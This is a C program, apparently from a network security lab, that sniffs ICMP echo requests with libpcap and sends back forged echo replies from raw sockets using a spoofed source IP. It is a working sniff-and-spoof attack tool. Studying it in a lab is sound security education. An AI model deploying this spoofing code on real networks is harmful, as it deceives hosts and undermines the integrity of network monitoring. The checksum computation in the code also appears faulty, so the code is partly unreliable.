#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>

#include <unistd.h>
#include <string.h>
#include <netinet/ip.h>
#include <stdlib.h>

#include "myheader.h"

unsigned short in_cksum(unsigned short *buf, int length);
void send_raw_ip_packet(struct ipheader *ip);

/******************************************************************
  Spoof an ICMP echo request using an arbitrary source IP Address
*******************************************************************/
int spoof_icmp(char *dst_add, char *src_add)
{
    char buffer[1500];

    memset(buffer, 0, 1500);

    /*********************************************************
      Step 1: Fill in the ICMP header.
    ********************************************************/
    struct icmpheader *icmp = (struct icmpheader *)(buffer + sizeof(struct ipheader));
    icmp->icmp_type = 0; //ICMP Type: 8 is request, 0 is reply.

    // Calculate the checksum for integrity
    icmp->icmp_chksum = 0;

    char *data = (char *)icmp + sizeof(struct icmpheader);
    const char *msg = "This is an ICMP spoofed response!\n";
    int data_len = strlen(msg);
    strncpy(data, msg, data_len);
    icmp->icmp_chksum = in_cksum((unsigned short *)icmp,
                                 sizeof(struct icmpheader))+data_len;
    /*********************************************************
      Step 2: Fill in the IP header.
    ********************************************************/
    struct ipheader *ip = (struct ipheader *)buffer;
    ip->iph_ver = 4;
    ip->iph_ihl = 5;
    ip->iph_ttl = 20;
    ip->iph_sourceip.s_addr = inet_addr(src_add);
    ip->iph_destip.s_addr = inet_addr(dst_add);
    ip->iph_protocol = IPPROTO_ICMP;
    ip->iph_len = htons(sizeof(struct ipheader) +
                        sizeof(struct icmpheader) + data_len);

    /*********************************************************
      Step 3: Finally, send the spoofed packet
    ********************************************************/
    send_raw_ip_packet(ip);
    return 0;
}
/*************************************************************
  Given an IP packet, send it out using a raw socket.
**************************************************************/
void send_raw_ip_packet(struct ipheader *ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock == -1)
    {
        printf("open socket is failed\n");
        exit(-1);
    }
    printf("socket is created successfully\n");

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
               &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;
    printf("start sending packet..\n");
    sleep(2);
    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    printf("sent packet is done successfully\n");

    close(sock);
    printf("close the socket\n");
}
unsigned short in_cksum(unsigned short *buf, int length)
{
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp = 0;

    /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }

    /* treat the odd byte at the end, if any */
    if (nleft == 1)
    {
        *(u_char *)(&temp) = *(u_char *)w;
        sum += temp;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
    sum += (sum >> 16);                 // add carry
    return (unsigned short)(~sum);
}

#define addr_len 20
void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet)
{
    struct ethheader *eth = (struct ethheader *)packet;

    if (ntohs(eth->ether_type) == 0x0800)
    { // 0x0800 is IP type
        struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
        struct icmpheader *icm = (struct icmpheader *)((packet + sizeof(struct ethheader) + sizeof(struct ipheader)));
        if (ip->iph_protocol == 1) // icmp protocol
        {
            if (icm->icmp_type == 8)
            {
                char src[addr_len];
                char dst[addr_len];
                strcpy(src, inet_ntoa(ip->iph_sourceip));
                strcpy(dst, inet_ntoa(ip->iph_destip));
                printf("   get an ICMP request..\n");

                if ((strcmp(src, dst) != 0))
                {
                    /* determine protocol */
                    printf("   From: %s\n", src);
                    printf("   To: %s\n", dst);
                    spoof_icmp(src, dst);
                    printf("\n");
                    return;
                }
            }
        }
    }
}

/**********************************************
 * Listing 12.3: Packet Capturing using raw libpcap
 **********************************************/
int main()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_icmp[] = "icmp"; // filter ICMP pkt
    bpf_u_int32 net;

    // Step 1: Open live pcap session on NIC
    handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        printf("cant open live pcap session, error: %s\n", errbuf);
        return 1;
    }
    printf("pcap open live is done successfully!\n");
    // Step 2: Compile filter_exp into BPF psuedo-code
    pcap_compile(handle, &fp, filter_icmp, 0, net);
    pcap_setfilter(handle, &fp);
    printf("start sniffing..\n");

    // Step 3: Capture packets
    pcap_loop(handle, -1, got_packet, NULL);
    printf("close socket!\n");

    pcap_close(handle); //Close the handle
    return 0;
}